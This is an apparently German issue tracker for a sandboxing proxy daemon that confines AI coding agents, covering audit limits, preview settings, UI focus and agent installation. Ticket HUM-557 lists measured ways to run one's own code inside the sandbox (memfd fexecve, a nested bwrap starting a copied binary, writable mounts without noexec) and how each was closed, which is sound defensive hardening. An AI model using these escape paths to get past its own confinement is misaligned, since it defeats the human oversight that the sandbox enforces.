- Audit: ein Schwall von Einträgen bei langsamem Schreiber lässt den
  Speicher nicht unbegrenzt wachsen und verliert keinen Eintrag der Sandbox.

### Akzeptanzkriterien
1. Eine Sitzung mit beliebig vielen Anfragen hält den Speicher des Daemons
   begrenzt, ohne gehaltene Flows oder Audit-Einträge der Sandbox zu
   verlieren.

### Stand nach der Umsetzung (2026-11-19)

- **Messung** (`daemon/crates/proxy/tests/registry_memory.rs`, zählender
  Allokator, Linux x86_64): Ein abgeschlossener Flow einer kleinen Anfrage
  (sechs Kopfzeilen, Pfad mit Query) belegt in der Registry 2,3 bis 2,6 KiB
  Heap, davon 816 Bytes im `FlowRecord` selbst. Ohne Grenze wuchs die Registry
  um so viel je Anfrage (100 000 Anfragen rund 250 MiB). Mit Grenze 10 000
  steigt sie bis 37,6 MB und bleibt dort, nach 80 000 wie nach 1 280 000
  Anfragen; mit Grenze 1 000 bei 4,6 MB ab 32 000 Anfragen. Die Luft über
  der reinen Datensatzgröße sind die Splitter der `DashMap`.
- **Registry:** neuer Schlüssel `limits.registry_max_finished_flows`
  (Vorgabe 10 000, `1..=1_000_000`, `expert`, für das Projekt-Profil
  gesperrt, im Einstellungskatalog `file_only`). Gezählt wird beim Übergang
  nach `Recorded`; verdrängt wird der älteste abgeschlossene, und nur, wenn er
  noch `Recorded` steht. Zahl statt Alter, weil eine Zahl den Speicher
  unabhängig von der Rate des Gasts begrenzt.
- **Audit:** `std::sync::mpsc::sync_channel` mit 4096 Plätzen
  (`WriterOptions::queue_capacity`). Ein voller Kanal lässt den Absender
  warten (Gegendruck), auf einem Arbeitsfaden der mehrfädigen Laufzeit über
  `block_in_place`; kein Record wird verworfen. Die Meldungen der Sandbox
  gehen direkt in diesen Kanal und kommen damit immer an. Der Sink des
  Ereignisstroms fällt bei vollem Kanal hinter den Rundfunk zurück und
  verliert Flow-Ereignisse mit `Lagged`; das ist die schon dokumentierte
  Grenze „nie geschriebene Ereignisse" (`docs/SECURITY.md` 8), jetzt auch
  bei langsamer Platte statt nur bei einem Schwall von Flows.
- **Aus dem Review:** Ein Absender legt seinen Auftrag nur unter einer
  Sperre in den Kanal, die auch das Schließen kennt; wer auf Platz wartet,
  wartet außerhalb davon in Pausen von 1 bis 20 ms. Bei `Stop` und beim
  Schließen setzt der Schreiber das Zeichen und schreibt alles, was schon im
  Kanal liegt, vor `daemon.stopped`; ein angenommener Record geht also nie
  verloren, ein späterer bekommt keinen Platz und `tracing` meldet ihn. Der
  Sink des Audit-Logs schließt bei `Lagged` alle offenen Flows ab (ein
  ausstehendes `flow.received` wird noch geschrieben), sonst wüchse seine
  Tabelle mit jedem verlorenen `Recorded`. Die Registry erreicht `Recorded`
  über `HoldQueue::publish`; `FlowRegistry::transition` sendet nur in den
  Strom, treibt aber gehaltene Flows, die nie verdrängt werden.
- `docs/THREAT-MODEL.md` K-38 nennt beide Grenzen.

---

## HUM-557 · Kernel-Stufe: die letzten Wege zu eigenem Code in der Unit

### Kontext
Aus HUM-480. Die Unit der Kernel-Stufe führt nur noch ihre eigenen Dateien
aus (`NoExecPaths=/`, `ExecPaths=` mit einzelnen Dateien, beschreibbare Pfade
in `NoExecPaths=`), gemessen auch nach der Zulassung. Offen blieben, mit
einem statischen Programm in einer Test-Unit gemessen:
- `fexecve` eines memfd läuft; `vm.memfd_noexec` ist 0, und kein Prozess der
  Unit darf es anheben.
- Ein Mount, den bubblewrap im Gefängnis selbst anlegt (tmpfs-Wurzel, Masken
  über `/work`, `--file`), trägt kein `noexec`:
  `bwrap --tmpfs /t --file 3 /t/p /t/p` läuft.
- Beides braucht einen Prozess, der schon eigenen Code ausführt, oder `sh`
  und `bwrap` aus der Liste zusammen. QEMU verbietet sich `exec`
  (`-sandbox spawn=deny`), virtiofsd hat einen eigenen seccomp-Filter,
  vhost-device-vsock hat keinen.

### Spezifikation
1. In jedem Gefängnis die übrigen Programme der Unit verdecken (etwa
   `/dev/null` über `sh`, `bwrap` und die anderen Helfer binden), so dass
   jeder Helfer nur sich selbst erreicht; messen, ob das den Weg „sh und
   bwrap zusammen" schließt.
2. Die Mounts, die bubblewrap im Gefängnis anlegt, mit `noexec` versehen,
   soweit bubblewrap das erlaubt (Optionen oder ein Remount danach);
   messen.
3. memfd: einen seccomp-Filter für vhost-device-vsock (wie bei virtiofsd)
   prüfen, der `memfd_create` mit `MFD_EXEC` und `execveat` mit leerem Pfad
   verweigert; oder begründet festhalten, warum nicht.
4. `docs/SECURITY.md` und `docs/THREAT-MODEL.md` K-33 (en, de) nachziehen.

### Tests
- KVM, mit dem wartenden Prozess im Gefängnis aus HUM-480 (läuft ohne
  `nsenter`, auch auf dem CI-Runner): jeder geschlossene Weg scheitert.
  Mutationsbeweis je Weg.

### Akzeptanzkriterien
1. Jeder geschlossene Weg ist gemessen und getestet; was offen bleibt, steht
   mit Grund in K-33.

### Stand nach der Umsetzung (2026-11-19)
Gemessen auf Debian 14 mit systemd 262, bubblewrap 0.13.1, QEMU 11.1.3,
virtiofsd 1.14.0 und vhost-device-vsock 0.3.0, zuerst mit einem statischen
Programm in Units `humanitl-test-*`, dann im KVM-Test mit Python als Prozess,
der eigenen Code ausführt (nur im Test in `ExecPaths=`).

**1. Die übrigen Programme verdeckt** (`lines::seal`,
`programs::hidden_in_jail`). Jedes Gefängnis bindet `/dev/null` über jedes
andere Programm der Unit, das es unter `/usr` sieht, unter dessen
aufgelöstem Pfad; ein `execve` darauf endet mit `EACCES` (126). Das schließt
„Shell und bubblewrap zusammen" schon allein. Dazu, unabhängig davon,
`--unshare-user --disable-userns` in jedem Gefängnis: Ein Prozess darin legt
keinen Nutzer-Namensraum mehr an (`ENOSPC`), hängt also nichts ein, und ein
verschachteltes bubblewrap scheitert sofort. Gemessen mit bubblewrap, das der
Test unter eigenem Pfad wieder erreichbar macht: ohne die Option startete
`bwrap --tmpfs /t --perms 0755 --file 9 /t/p /t/p` eine Kopie von Python aus
seinem tmpfs (Status 0), mit ihr `ENOSPC`.

**2. Keine beschreibbare Einhängung ohne `noexec`.** bubblewrap 0.13 kennt für
eigene Einhängungen kein `noexec` und kein Neu-Einhängen damit. Gemessen
blieben drei Orte: die Wurzel des Gefängnisses (ein tmpfs, das dem Nutzer
gehört), `/dev` (ebenso, mit `/dev/shm` als Verzeichnis darin) und die tmpfs
von `--tmpfs` (die leeren Verzeichnisse der Wurzel des Gasts und die Masken
über `/work`). Die ersten beiden und die tmpfs der Wurzel des Gasts hängt
jedes Gefängnis am Ende nur lesbar neu ein (`--remount-ro`); eine Kopie
dorthin scheitert mit `EROFS`. In die Masken über `/work` schreibt der Gast;
sie sind jetzt tmpfs der Unit (`TemporaryFileSystem=<Laufzeitverzeichnis>/masks/<n>:size=67108864,mode=0700,noexec,nosuid,nodev`),
die das Gefängnis bindet; das `noexec` erbt es gesperrt. Eine Kopie dort ist
geschrieben, ihr Start endet mit `EACCES`. Die Grenze von 64 MiB je Maske
gilt weiter (`a_write_beyond_a_mask_s_size_ends_with_enospc` grün).

**3. memfd: ein Filter.** `exec_filter.rs`, klassisches BPF von Hand, elf
Befehle, von bubblewrap mit `--seccomp 7` vor dem Start des Helfers
aufgelegt; das Skript öffnet die Datei aus `files/`. Für virtiofsd und das
vsock-Gerät verweigert er `execveat` ganz und `memfd_create` ohne
`MFD_NOEXEC_SEAL`; nur auf das Fehlen dieser Marke zu prüfen, nicht auf
`MFD_EXEC`, ist nötig, weil bei `vm.memfd_noexec = 0` auch ein `memfd` ohne
beide Marken ausführbar ist. `execve` muss offen bleiben (bubblewrap startet
damit den Helfer, und ein Filter ohne Zustand unterscheidet den ersten Aufruf
nicht von späteren); über `/proc/self/fd` läuft trotzdem nichts, weil kein
ausführbarer `memfd` entsteht. Der Emulator legt den Speicher des Gasts
selbst als `memfd` an und bekommt deshalb nur die Regel für `execveat`;
`execve` verbietet er sich mit `-sandbox spawn=deny` (gemessen: sein `memfd`
trägt die Rechte 777, ist also ausführbar). Die x32-ABI bekommt
`EPERM`, eine fremde Architektur endet. Gemessen: `memfd_create(0)` im
Gefängnis des Geräts endet mit `EPERM`, `fexecve` im Gefängnis der Maschine
ebenso.

**Offen, in K-33:** Ein Prozess, der schon eigenen Code ausführt, kann ihn in
seinem eigenen Speicher ausführen (`mprotect`); das startet kein Programm. Der
Dienst der Wurzel sieht die Programme der Unit unter `/guest/usr`, dem `/usr`
des Gasts; verdecken ginge nur auf Kosten des Gasts. Dort erreicht er sie,
aber bubblewrap legt keinen Namensraum an, und keine beschreibbare
Einhängung seines Gefängnisses lässt etwas laufen.

Tests: `exec_filter::tests` (ein Interpreter rechnet jede Antwort nach),
`programs::tests::a_jail_hides_every_other_program_of_the_unit`,
`lines::tests::every_jail_ends_sealed_before_its_program`,
`the_unit_carries_the_hardening_of_the_spike` (`TemporaryFileSystem=`); KVM
`own_code::a_helper_reaches_no_code_of_its_own_choosing`: Python im Gefängnis
der Maschine und in dem des Geräts (`TestMachine::device_command`, neu)
versucht jeden Weg, die wartende Unterschale nach der Zulassung drei davon;
die Shell des Tests liegt unter `/humanitl-test/sh`, weil die Shell der Unit
verdeckt ist, und die Host-Prüfung kennt den Namen nur im Test.
Mutationsbeweise, je einzeln, Test jedes Mal rot: ohne die Masken laufen die
verdeckten Programme (`bubblewrap 0.13.1`, Status 0); ohne
`--disable-userns` startet das verschachtelte bubblewrap die Kopie; ohne
`--remount-ro` laufen die Kopien in `/` und `/dev/shm`, auch nach der
Zulassung; ohne `noexec` in `TemporaryFileSystem=` läuft die Kopie in der
Maske; ohne die Regel für `execveat` läuft `fexecve` im Gefängnis der
Maschine, auch nach der Zulassung; mit dem Filter des Emulators im Gefängnis
des Geräts läuft der `memfd` über `/proc/self/fd`. Alle 28 KVM-Tests grün.

---

## HUM-558 · Test `fd_handover::nobody_coming_ends_the_wait_and_the_socket` wackelt unter paralleler Last

### Kontext
Bei HUM-480 und beim Zusammenführen von HUM-480 mit `main` (2026-11-19)
fiel `fd_handover::tests::nobody_coming_ends_the_wait_and_the_socket` im
vollen Lauf von `cargo test -p humanitl-sandbox --lib` zweimal um
(`fd_handover.rs:576`), allein lief er jedes Mal grün (dreimal hintereinander).
Ein Test, der unter Last kippt, macht die CI unzuverlässig und verdeckt
echte Fehler.

### Spezifikation
1. Ursache finden: feste Wartezeit gegen eine Frist, die unter Last nicht
   reicht, oder ein echter Wettlauf im Code der Übergabe.
2. Ist es der Test: auf ein Ereignis warten statt auf eine Zeit, ohne die
   Aussage des Tests zu schwächen. Ist es der Code: beheben, mit Test.

### Tests
- Der Test läuft 50-mal unter paralleler Last (`cargo test` mit allen
  Tests des Crates) grün.

### Akzeptanzkriterien
1. Kein Fehlschlag in 50 Läufen unter Last; die Aussage des Tests bleibt.

---

## HUM-559 · Plan-Vorschau kennt die Untergrenze der Kommandozeile nicht

### Kontext
Aus dem Review von HUM-489. `humanitl run` und `humanitl go` schicken seit
HUM-489 die Untergrenze der Isolation, die der Client aufgelöst hat
(Flag, Umgebung, `--config`), mit dem Start an den Daemon. Die Vorschau über
`Sandbox(Plan)` (`daemon/bin/humanitl/src/cmd/plan.rs`, Bau von
`v1::sandbox_request::Plan`) trägt keine Overrides der Sitzung. Eine
Vorschau mit `--sandbox-min-isolation kernel` zeigt dann den Plan mit der
schwächeren Untergrenze des Daemons, der Start danach scheitert mit
`SANDBOX_035` oder wählt ein anderes Backend als gezeigt.

### Spezifikation
1. Die Vorschau bekommt dieselben Overrides der Sitzung wie der Start
   (derselbe Weg wie `start_overrides` aus HUM-489), samt Sperre
   `CLI_004` für einen Daemon vor 1.49.
2. Prüfen, ob weitere Wege einen Plan ohne diese Overrides zeigen (App,
   `Projects.proposal` aus HUM-536).

### Tests
- Vorschau mit `--sandbox-min-isolation kernel` und `auto` zeigt
  `SANDBOX_035` wie der Start. Mutationsbeweis: ohne Overrides rot.

### Akzeptanzkriterien
1. Vorschau und Start zeigen bei gleichen Eingaben dieselbe Untergrenze.

### Stand nach der Umsetzung (2026-11-20)

**Neues Feld statt eigener Logik.** `SandboxRequest.Plan` trägt
`cli_overrides` (Feld 8, Vertrag 1.55), dieselben Werte der Sitzung wie
`Start.cli_overrides`. `humanitl sandbox plan` füllt es aus derselben
Funktion wie der Start (`run::client_overrides`, also `start_overrides` aus
HUM-489: Flags, Umgebung, Datei aus `--config`, die Untergrenze als
aufgelöster strengster Wert). Der Daemon mischt die Werte in
`SessionResolver::resolve_plan` auf der Ebene der Kommandozeile, nach
`check_override_key` wie beim Start; die Untergrenze hebt also nur, ein Pfad
außerhalb der Erlaubnisliste ist `CONFIG_003`. Steht `sandbox.backend` in den
Werten und in `Plan.backend`, gilt `Plan.backend`. `plan_of` im Start lässt
das Feld leer, weil der Start seine Werte über `apply_session` anwendet.

**Projektwahl wie beim Start** (Review). Der Start löst mit der
gespeicherten Projektwahl des Ordners auf (HUM-532), die Ebene unter den
Werten der Sitzung. Der Plan tat das nicht: Eine Wahl `kernel` mit `qemu` und
`--sandbox-min-isolation policy --sandbox-backend auto` zeigte `policy`,
der Start blieb bei `kernel` und lehnte mit `SANDBOX_035` ab. Jetzt lädt der
Arm von `Op::Plan` die Wahl vorher wie der Start (`plan_project_choice`, über
`project_in`, das `start_project` mit dem Ordner der Anfrage teilt), und
`resolve_plan` löst mit `resolve_with_choice` auf. Ohne Ordner in der
Anfrage kommt der Ordner der Wahl aus derselben frischen Auflösung wie der
Plan (`SessionResolver::stored_work_dir`), nicht aus dem Zwischenstand des
Daemons; sonst bekäme nach einem Wechsel von `sandbox.work_dir` der neue
Ordner die Wahl des alten. Scheitert das Laden (`CONFIG_024`), scheitert der
Plan damit wie der Start, statt ohne die Wahl eine schwächere Untergrenze zu
zeigen (Delta-Review). `Argv` und das Ziehen eines Abbilds laden die Wahl nicht; das
blieb außerhalb des Umfangs.

**Ältere Daemons.** Ein Daemon vor 1.55 kennt `Plan.cli_overrides` nicht.
Das Backend des Aufrufs reist deshalb zusätzlich in `Plan.backend` (seit
1.38); jeder andere Wert (Untergrenze, `llm.endpoint`, Haltefrist,
Laufzeit) endet gegen einen solchen Daemon mit `CLI_004`, vor 1.38 auch das
Backend (`plan::preview_values`); der Befund nennt die Minor, die der
abgelehnte Wert braucht. Ohne Werte geht die Vorschau wie bisher.
`humanitl sessions` nutzt dieselbe Momentaufnahme, schickt aber keine Werte
der Sitzung (`SessionValues::Without`) und trifft die Sperre nie.

**Weitere Wege.** Die App schickt als Wert der Sitzung nur das Backend, und
das trägt ihr Plan schon in `Plan.backend` (HUM-440); Vorschau und Start der
App sehen dieselbe Untergrenze, keine Änderung. `Projects.proposal` (HUM-536)
rechnet mit Konfiguration, Projekt-Profil und Projektwahl, ohne Werte der
Kommandozeile; seine Anfrage hat dafür kein Feld. `humanitl projects
proposal` warnt deshalb mit `CLI_004` und nennt die Werte, die der
Vorschlag nicht kennt, statt sie still fallen zu lassen. Den Vorschlag
selbst um die Werte zu erweitern, ist ein Kandidat für ein eigenes Issue.
Nebenbei sieht die Vorschau jetzt auch `--sandbox-backend`, `--llm URL` und
die Variablen des Backends, die sie vorher still überging.

**Tests.** In `cmd::plan::tests`: `the_preview_raises_the_floor_like_the_start`
(Flag und Variable, Plan gleich den Werten des Starts, Auflösung des Plans im
Daemon `kernel`, `auto` mit `SANDBOX_035`; Gegenprobe ohne Untergrenze),
`an_old_daemon_gets_no_preview_without_the_floor`,
`the_sessions_snapshot_sends_no_session_values` und
`an_older_daemon_previews_the_backend_and_refuses_what_it_cannot_see`. In
`cmd::projects::tests`: `the_proposal_names_the_session_values_it_does_not_see`
und `the_proposal_command_warns_about_a_floor_of_the_command_line`. In
`sandbox::project::tests`:
`the_preview_resolves_with_the_saved_choice_like_the_start` (genau das
Szenario oben, Plan und Start beide `SANDBOX_035`),
`a_choice_that_no_longer_loads_stops_the_preview_like_the_start` und
`the_preview_loads_the_choice_of_the_folder_configured_now` (Wechsel A nach
B). In `session_config.rs`:
`the_preview_sees_the_floor_of_the_session_like_the_start` und
`the_backend_of_the_plan_wins_over_the_backend_in_its_values`.
Mutationsbeweise: `cli_overrides` in `plan_request` leer, die Werte in
`resolve_plan` nicht gemischt, `plan_config` ohne die Werte,
`check_override_key` im Plan weg, die Schwelle 1.49 statt 1.55, die Wahl in
`resolve_plan` oder im Arm von `Op::Plan` weggelassen, `sessions` mit den
Werten, `Plan.backend` leer, die Sperre nur für die Untergrenze,
`proposal_request` ohne Warnung, der Filter auf `sandbox.backend` weg, der
Befund des Ladens verworfen, der Ordner der Wahl aus dem Zwischenstand, die
Minor 1.55 statt der des Werts im Befund; jede
färbt mindestens einen Test rot.

---

## HUM-560 · App: im Reiter Isolation verliert eine Wahl des Backends per Tastatur den Fokus

### Kontext
Aus HUM-510. Wählt man in den Einstellungen das Backend per Tastatur,
schreibt die App `sandbox.backend`, das Mitglied des
`sandboxBackendsProvider` lädt neu und sperrt die Segmente kurz; ein
gesperrtes Segment verliert den Fokus. HUM-510 gibt ihn in der
Einstellungszeile nach dem Neuladen zurück. Im Abschnitt des Reiters
Isolation (`SandboxBackendSection`) passiert dasselbe seit HUM-504 (neues
Mitglied ohne Wert, Segmente gesperrt), dort kommt der Fokus nicht zurück.

### Spezifikation
1. Der Abschnitt gibt den Fokus nach dem Neuladen dem gewählten Segment
   zurück, wenn er vorher in der Wahl lag, wie die Zeile aus HUM-510; wer
   woanders war, wird nicht hineingezogen.
2. Möglichst ein gemeinsamer Baustein für Zeile und Abschnitt statt einer
   Kopie.

### Tests
- Wahl per Enter im Abschnitt, Neuladen zurückgehalten, danach Fokus wieder
  in der Wahl; Linux und macOS. Mutationsbeweis: ohne Rückgabe rot.

### Akzeptanzkriterien
1. Eine Wahl per Tastatur lässt den Fokus in der Wahl, in Zeile und
   Abschnitt.

### Stand nach der Umsetzung (2026-11-20)
Neu `SandboxBackendSegments` in `core/ui/sandbox_backend_choice.dart`: die
Segmente der Backend-Wahl samt dem Fokusknoten um sie, gemeinsam für die
Zeile `sandbox.backend` der Einstellungen und `SandboxBackendSection` im
Reiter Isolation. Der Baustein merkt sich beim Übergang von bedienbar zu
gesperrt, ob die Segmente den Fokus hatten (die Segmente bauen erst nach
seinem `didUpdateWidget` gesperrt und halten ihn bis dahin), und gibt ihn
beim Entsperren nach dem nächsten Bild dem gewählten Segment zurück; wer
woanders war, wird nicht hineingezogen. Er hängt nicht mehr an einem
Provider, sondern nur am Wert `enabled`, den beide Aufrufer schon aus
`sandboxBackendsOutdated` und dem fehlenden Wert des neuen Mitglieds
ableiten. Die Logik aus HUM-510 ist aus der Zeile in den Baustein gezogen;
die Zeile ist wieder ein `ConsumerWidget`.

**Tests.** sandbox: Wahl von Container per Enter, Liste für Container
zurückgehalten, Segmente gesperrt und ohne Fokus, nach der Antwort Fokus auf
dem Segment Container; Wechsel des Projekts ohne Fokus in der Wahl lässt ihn
draußen. Je unter Linux und macOS. Die Tests der Zeile aus HUM-510 bleiben
unverändert und grün. Mutationsbeweise: Merken als `false` macht die Tests
der Tastaturwahl in Abschnitt und Zeile rot, als `true` die Tests „nicht
hineingezogen“ in Abschnitt und Zeile. Keine Goldens geändert: Ein
Fokusknoten ohne eigenen Fokus zeichnet nichts.

**Nach dem Review.** Codex: Wer nach der Wahl per Enter während der Sperre
ein anderes Bedienelement fokussiert (Klick, Tab), bekam den Fokus beim
Entsperren trotzdem in die Wahl zurückgezogen. Der Baustein hält jetzt fest,
auf welchen Knoten der Fokus fiel, als die Sperre ihn den Segmenten nahm
(Listener am umschließenden Knoten, nach dem Setzen des neuen Fokus), und
gibt ihn nur zurück, wenn er beim Entsperren noch dort steht. Tests: in
Abschnitt und Zeile ein anderes Bedienelement während der Sperre fokussiert,
danach bleibt der Fokus dort, je unter Linux und macOS, rot mit einer
Rückgabe ohne den Vergleich. Sonnet als Ersatz: Test, dass eine während der
Sperre verschwundene Wahl (Start einer Sitzung) keine Ausnahme wirft und den
Fokus nicht bewegt. Codex im Delta: Wer den Fokus während der Sperre
fortbewegt und ihn vor dem Entsperren dorthin zurückbringt, wohin die Sperre
ihn schob, bekam ihn trotzdem in die Wahl gezogen, weil nur beim Entsperren
verglichen wurde. Der Baustein hängt sich während der Sperre an den
Fokus-Manager und hebt die Rückgabe bei der ersten Bewegung weg von diesem
Knoten endgültig auf. Tests: Fokus fort und zurück in Abschnitt und Zeile,
je unter Linux und macOS, rot mit einem Vergleich nur beim Entsperren.

Offen als Kandidat: Die Sperre schiebt den Fokus auf den Wurzelbereich der
Ansicht, oberhalb der `Shortcuts` der App; dort bewegt Tab ihn nicht weiter,
bis die Sperre endet.

---

## HUM-561 · Regeln: ein einziger fehlerhafter Eintrag in `rules.yaml` verwirft beim Start alle Regeln des Nutzers

### Kontext
Gefunden bei HUM-526. Scheitert eine einzige Regel beim Lesen (etwa ein
von Hand geschriebenes `expires`, das sich nicht lesen lässt), liefert
`parse_expiry` `RULES_001` mit Schwere Error; `parse_rules_for_session`
(`daemon/crates/rules/src/parse.rs`, etwa Zeile 130) gibt bei jedem Error
`Err` zurück, und `rules_store.rs` (etwa Zeile 820) macht daraus eine
leere Regelliste. Alle Regeln des Nutzers sind dann weg, bis die Datei
repariert ist; jede Anfrage landet wieder beim Menschen. Das ist nicht
unsicher (nichts wird ungewollt erlaubt), aber still und lästig, und eine
gespeicherte Sperre (`block`) wirkt in der Zeit nicht mehr, sondern wird
zur Nachfrage.

### Spezifikation
1. Eine Regel, die sich nicht lesen lässt, fällt allein heraus; die übrigen
   gelten weiter. Der Befund nennt Zeile und Grund und erscheint beim
   Start (Diagnose, `doctor`, App).
2. Prüfen, ob eine nicht lesbare `block`-Regel stattdessen als Sperre
   bestehen bleiben sollte (fail closed), und das begründet entscheiden.
3. Die Datei wird beim nächsten Schreiben nicht stillschweigend ohne die
   kaputte Regel überschrieben; die kaputte Zeile bleibt erhalten oder wird
   gesichert.

### Tests
- `rules.yaml` mit einer kaputten und zwei gültigen Regeln: beide gültigen
  gelten, der Befund nennt die kaputte. Mutationsbeweis: altes Verhalten
  färbt rot.
- Schreiben nach dem Start erhält die kaputte Zeile (oder legt die
  Sicherung an).

### Akzeptanzkriterien
1. Ein Fehler in einer Regel kostet nie die anderen Regeln.

---

## HUM-562 · `config set` nimmt Werte an, die erst der Start des Daemons ablehnt

### Kontext
Aus HUM-507. Seit HUM-507 ist jeder Vorschlag „Einstellung ändern" ein Wert,
den `humanitl config set` annimmt. Dabei fiel auf, dass `config set` selbst
manches annimmt, was erst der Start des Daemons ablehnt:
- `resolver.test_ca` nimmt jeden Text, auch einen relativen Pfad; erst der
  Start meldet `CONFIG_012`.
- Platzhalter wie `https://api.example.com/v1` für `llm.endpoint` gehen
  durch, obwohl sie nie funktionieren.
- Abhängigkeiten zwischen Schlüsseln prüft nur der Start, etwa
  `limits.hold_body_cap_bytes` über einem kleineren `limits.hold_max_bytes`
  in der echten Datei.

### Spezifikation
1. `config set` prüft jeden Wert gegen dieselben Regeln wie der Start,
   einschließlich der Abhängigkeiten zur übrigen Datei (Auflösung der
   echten Datei plus des neuen Werts), und lehnt mit derselben Diagnose ab.
2. Pfade, die absolut sein müssen, werden schon beim Setzen als solche
   geprüft.
3. Entscheiden, ob bekannte Platzhalter-Hosts (`example.com`, `.test`,
   `.invalid`) beim Setzen eine Warnung bekommen.

### Tests
- Ein relativer Pfad für `resolver.test_ca` und ein Cap über dem Höchstwert
  der echten Datei werden von `config set` abgelehnt, mit dem Code des
  Starts. Mutationsbeweis.

### Akzeptanzkriterien
1. Was `config set` annimmt, lehnt der Start nicht ab.

---

## HUM-563 · Agent-Depot: Wartungssitzung im Daemon, RPC und CLI `agents install`/`update`

### Kontext
Aus HUM-519. Der Kern (Rezept, Vorbereitung des Laufs, Übernahme, Prüfung
der Signatur, atomares Umschalten) steht im Sandbox-Crate, aber nichts im
Daemon startet den Lauf. HUM-520 (Anmeldung als Wartungslauf) und HUM-522
(Ende-zu-Ende-Lauf) brauchen diese Sitzungsart.

### Spezifikation
1. Sitzungsart `DepotMaintenance` im `SandboxService`: Start ohne `/work`,
   Arbeitsordner als `HOME` unter `MAINTENANCE_HOME_DST`, die Sitzungsregeln
   des Rezepts in den Regelspeicher (`Expiry::Session`), kein Briefing,
   nach dem Ende `commit` der Übernahme aus HUM-519.
2. RPC `Agents` mit `install` und `update` samt Sitzung (Protokoll-Minor),
   Befunde als `Diagnostic` (`AGENT_011` und folgende).
3. CLI `humanitl agents install|update <agent> [--version] [--yes]`, hängt
   sich an das Terminal des Laufs; Parität, `docs/cli.md` (en, de).
4. Ein Selbst-Update des Agenten im Lauf scheitert am nur lesbaren Ordner
   des Programms; das ist gewollt und wird im Befund genannt.
5. `docs/SECURITY.md` und `docs/THREAT-MODEL.md` K-36 (en, de): was der
   Wartungslauf darf und was nicht.

### Tests
- Ende-zu-Ende im bwrap mit einem Stellvertreter-Server hinter dem Proxy:
  Installation über die Regeln des Rezepts, ein fremder Host wird
  gehalten, eine Folgesitzung sieht die neue Version.
- Mutationsbeweis: ohne `commit` nach dem Ende bleibt `current` unverändert
  und der Test ist rot.

### Akzeptanzkriterien
1. `humanitl agents install claude` installiert über eine Sandbox mit
   Proxy ins Depot, ohne dass auf dem Host etwas Heruntergeladenes läuft.

### Stand nach der Umsetzung (2026-11-19)

Gebaut: die Sitzungsart im `SandboxService` (`ipc/src/sandbox/maintenance.rs`).
Der Arbeitsordner des Laufs steht an der Stelle des Projekts unter
`MAINTENANCE_HOME_DST` und ist `HOME`; ein `/work` gibt es nicht, das
Sandbox-Profil gilt ohne `mounts.extra_ro` und `mounts.extra_rw`, die
Host-Installationen des Agenten sind maskiert. Der Wächter des Depots lässt
diesen Ordner unter dem Datenordner nur für eine vom Daemon gekennzeichnete
Sitzung zu (`guard::work_place`, sonst `SANDBOX_006`). Die Regeln des Rezepts
gehen als Sitzungsregeln in den Speicher und nach dem Ende wieder hinaus; die
mitgelieferte Gruppe ist während des Laufs nur `rules/default.yaml` ohne
Durchreiche. Übernommen wird nur nach Status 0 und grünen Garantien. RPC
`Agents.install`/`update` (Protokoll 1.52) mit `AgentDepot.maintenance`; CLI
`humanitl agents install|update <agent> [--version] [--yes]` hängt sich an das
Terminal des Laufs und meldet das Ergebnis; `agents status` zeigt den letzten
Lauf; `agents remove` wird abgelehnt, solange ein Lauf des Agenten geht
(`AGENT_018`). Docs: `docs/cli.md`, SECURITY und K-36 (en, de).

Abweichungen: Kernel-Stufe und Seatbelt lehnen einen Wartungslauf vorerst ab
(`AGENT_015`). Ein Lauf braucht den Anspruch auf den Start wie jede Sitzung,
also kein Update, solange eine Sitzung in diesem Daemon läuft (`CLI_005`); der
Test „Update während einer laufenden Sitzung“ aus HUM-519 bleibt auf der Ebene
des Kerns. Das Selbst-Update steht nicht in einem eigenen Befund, sondern in
Ausgabe, Docs und im Beleg des Ende-zu-Ende-Tests.

Nicht abgedeckt: der CLI-Weg Ende-zu-Ende mit laufendem Daemon (nur
Unit-Tests), Podman nur übersetzt, kein echter Download mit Signatur.

Ausnahme der Kopplungs-Grundlinie: `daemon/crates/ipc/tests/depot_maintenance.rs`
baut den echten Proxy-Stapel (Regelspeicher, Pipelines, Warteschlange,
Handler) mit einem Stellvertreter-Egress und steht deshalb mit 24 Namen von
`humanitl_proxy` in `tools/coupling-baseline.toml`; nur Testcode, der
Produktionscode der Wartungssitzung nennt den Crate nicht.

---

## HUM-564 · Audit: ein Rückstand des Audit-Zweigs (`Lagged`) erscheint nicht im Audit-Log

### Kontext
Aus dem Review von HUM-556. Seit der Kanal zum Audit-Schreiber begrenzt ist,
wartet der Audit-Zweig bei voller Warteschlange und kann hinter den
Rundfunk der Flow-Ereignisse zurückfallen. Verlorene Ereignisse meldet
`lagged()` nur über `tracing`; die Kette des Audit-Logs zeigt keine Lücke.
Nach einem Rückstand schließt der Zweig alle offenen Flows ab, auch solche,
die danach weiterlaufen; deren späterer Status oder Befunde fehlen dann.

### Spezifikation
1. Bei `Lagged(n)` schreibt der Zweig einen eigenen Audit-Eintrag
   (etwa `audit.events_dropped` mit der Zahl), damit die Lücke in der Kette
   sichtbar ist.
2. Prüfen, ob sich offene Flows nach dem Rückstand gezielter abschließen
   lassen (nur die, deren Ende verloren ist), ohne dass die Tabelle wieder
   ohne Grenze wächst; sonst die Grenze in K-38 nennen.

### Tests
- Ein erzwungener Rückstand hinterlässt genau einen Eintrag mit der Zahl
  der verlorenen Ereignisse. Mutationsbeweis.

### Akzeptanzkriterien
1. Jeder Verlust von Flow-Ereignissen im Audit-Zweig steht im Audit-Log.

---

## HUM-565 · Audit: ein gescheiterter Flow hat keinen Eintrag im HMAC-Audit-Log

### Kontext
Aus HUM-555. Ein Flow, der an der Gegenstelle scheitert (etwa
`upstream_proxy_closed` im Nachfragemodus `upstream`), trägt seinen Grund
in Historie und Aufzeichnung, aber das HMAC-Audit-Log kennt keinen Eintrag
`flow.failed`; dort endet so ein Flow ohne Ergebnis. Die Anleitungen zu
Burp und mitmproxy sagen das heute als Grenze.

### Spezifikation
1. Neuer Eintrag `flow.failed` mit Flow, Sitzung und Grund (`upstream_*`
   bzw. der Code der Diagnose), ohne Inhalt der Anfrage.
2. `docs/SECURITY.md`, die Anleitungen zu Burp und mitmproxy (en, de) und
   `CONVENTIONS.md` (Liste der Audit-Einträge) nachziehen.

### Tests
- Ein Flow, den der Proxy dahinter schließt, hinterlässt `flow.failed`
  mit `upstream_proxy_closed`. Mutationsbeweis.

### Akzeptanzkriterien
1. Jeder gescheiterte Flow hat im HMAC-Audit-Log einen Eintrag mit Grund.

